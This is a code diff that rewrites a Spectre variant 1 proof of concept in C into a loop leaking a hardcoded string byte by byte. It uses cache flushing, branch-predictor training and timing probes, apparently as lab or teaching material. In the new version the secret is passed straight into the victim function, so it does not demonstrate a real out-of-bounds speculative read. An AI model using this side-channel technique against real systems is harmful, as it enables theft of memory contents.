@@ -1,74 +1,81 @@
-// spectre variant 1
-
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
 #include <intrin.h>
 
-#define CACHE_THRESHOLD 80  // CPU cycles to distinguish hit vs miss
-#define STRIDE 512          // Offset to prevent hardware prefetching
+#define STRIDE 4096
+#define CACHE_THRESHOLD 90
 
 uint8_t target_array[256 * STRIDE];
-uint8_t secret_data = 42;    // This is the "secret" we want to leak
-size_t boundary = 10;        // The "legal" limit for access
+char *secret_string = "L1G-Y*M47TR";
+size_t boundary = 16;
 
-/**
- * The Victim Function
- * The CPU may speculatively execute the line inside the 'if' even if
- * index >= boundary, provided the branch predictor is "trained."
- */
-void victim_function(size_t index) 
+// The "Victim" - This mimics a kernel or library function 
+// that checks bounds before accessing an array.
+void victim_function(size_t index, uint8_t secret_byte)
 {
     if (index < boundary) 
     {
-        // Speculative access based on secret_data
-        volatile uint8_t dummy = target_array[secret_data * STRIDE];
+        // Speculative execution uses secret_byte to index target_array
+        volatile uint8_t dummy = target_array[secret_byte * STRIDE];
     }
+}
+
+void leak_byte(uint8_t byte_to_leak, int char_pos) 
+{
+    unsigned int junk = 0;
+    int hits[256] = {0};
+    uint64_t timings[256] = {0};
+
+    // 1. Flush the target array
+    for (int i = 0; i < 256; i++) _mm_clflush(&target_array[i * STRIDE]);
+        _mm_mfence();
+
+    // 2. Train and Attack
+    for (int i = 50; i >= 0; i--) 
+    {
+        _mm_clflush(&boundary); // Force a slow boundary check
+        for (volatile int z = 0; z < 100; z++); // Settle pipeline
+
+        // Train 5 times with index 0, then attack once with index 999
+        size_t training_index = (i % 6 == 0) ? 999 : 0;
+        victim_function(training_index, byte_to_leak);
+    }
+    _mm_mfence();
+
+    // 3. Measure - Probe all 256 possible byte values
+    for (int i = 0; i < 256; i++) 
+    {
+        int mixed_i = ((i * 167) + 13) & 255; 
+        uint64_t t1 = __rdtscp(&junk);
+        volatile uint8_t val = target_array[mixed_i * STRIDE];
+        uint64_t t2 = __rdtscp(&junk);
+        
+        uint64_t delta = t2 - t1;
+        if (delta < CACHE_THRESHOLD && mixed_i != 0) {
+            hits[mixed_i]++;
+            timings[mixed_i] = delta;
+        }
+    }
+
+    // 4. Verbose Report for this specific character position
+    printf("Pos %2d | Reading char... ", char_pos);
+    for (int i = 0; i < 256; i++) 
+    {
+        if (hits[i] > 0)
+            printf("[Byte: %d ('%c') | Time: %llu cycles] ", i, (i > 31 && i < 127) ? i : '?', timings[i]);
+    }
+    printf("\n");
 }
 
 int main() 
 {
-    unsigned int junk = 0;
-    size_t malicious_index = 999; // Clearly out of bounds
+    memset(target_array, 1, sizeof(target_array));
+    printf("\nBoundary: %zu | Stride: %d | Threshold: %d\n\n", boundary, STRIDE, CACHE_THRESHOLD);
 
-    // Initialize target_array to ensure it's mapped in memory
-    for (int i = 0; i < 256; i++) 
-        target_array[i * STRIDE] = 1;
-
-    // --- STEP 1: FLUSH ---
-    // Ensure the secret-dependent index is not in the cache
-    for (int i = 0; i < 256; i++)
-    {
-        _mm_clflush(&target_array[i * STRIDE]);
-    }
-    _mm_mfence(); // Memory fence to ensure flush completes
-
-    // --- STEP 2: TRIGGER ---
-    // Train the predictor with "legal" calls (optional in simple labs)
-    for (int i = 0; i < 10; i++) 
-        victim_function(i);
+    for (int i = 0; i < strlen(secret_string); i++)
+        leak_byte((uint8_t)secret_string[i], i);
     
-    // Now call with out-of-bounds index
-    _mm_clflush(&boundary); // Force CPU to speculate while waiting for 'boundary'
-    _mm_mfence();
-    victim_function(malicious_index);
-
-    // --- STEP 3: RELOAD & TIME ---
-    // We check which index in target_array was pulled into the cache
-    printf("Testing cache hits:\n");
-    for (int i = 0; i < 256; i++) 
-    {
-        uint64_t t1 = __rdtscp(&junk);
-        volatile uint8_t val = target_array[i * STRIDE];
-        uint64_t t2 = __rdtscp(&junk);
-
-        uint64_t access_time = t2 - t1;
-
-        if (access_time < CACHE_THRESHOLD && i != 0) 
-        {
-            printf("Cache Hit at index [%d]! Time: %llu cycles\n", i, access_time);
-            printf("The secret data leaked is: %d\n", i);
-        }
-    }
 
     return 0;
 }
